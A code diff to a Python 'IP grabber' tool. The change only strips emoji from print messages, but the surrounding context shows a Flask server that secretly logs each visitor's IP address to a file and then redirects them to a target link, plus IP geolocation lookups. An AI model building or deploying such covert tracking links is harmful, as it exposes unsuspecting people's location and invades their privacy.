@@ -60,7 +60,7 @@ def print_details(data):
         print(f"ISP        : {data['isp']}")
         print(f"Lat/Lon    : {data['lat']}, {data['lon']}")
     else:
-        print(f"❌ Error: {data.get('message', 'You Entered a Wrong IP Brother')}")
+        print(f"Error: {data.get('message', 'You Entered a Wrong IP Brother')}")
 
 # --- OPTION 2: TRACK EXISTING LINK ---
 
@@ -75,7 +75,7 @@ def track_link_and_redirect():
         data = get_location_data(ip_address)
         print_details(data)
     except Exception as e:
-        print(f"❌ Error: {e}")
+        print(f"Error: {e}")
 
 # --- OPTION 3: GENERATE GRABBER LINK (FLASK) ---
 
@@ -92,7 +92,7 @@ def grab_ip():
     with open("log.txt", "a") as f:
         f.write(f"[{timestamp}] IP: {visitor_ip}\n")
     
-    print(f"🚩 Captured IP: {visitor_ip} at {timestamp}")
+    print(f"Captured IP: {visitor_ip} at {timestamp}")
     return redirect(TARGET_GITHUB)
 
 def start_grabber_server():
@@ -101,9 +101,9 @@ def start_grabber_server():
     if not TARGET_GITHUB.startswith('http'):
         TARGET_GITHUB = 'https://' + TARGET_GITHUB
     
-    print("\n🚀 IP Grabber is starting...")
-    print("⚠️  To make this a public link contact developer.")
-    print("❌ Press CTRL+C to stop the server and return to menu.\n")
+    print("\n IP Grabber is starting...")
+    print("To make this a public link contact developer.")
+    print(" Press CTRL+C to stop the server and return to menu.\n")
     
     # Run the Flask server
     app.run(host='127.0.0.1', port=7737)
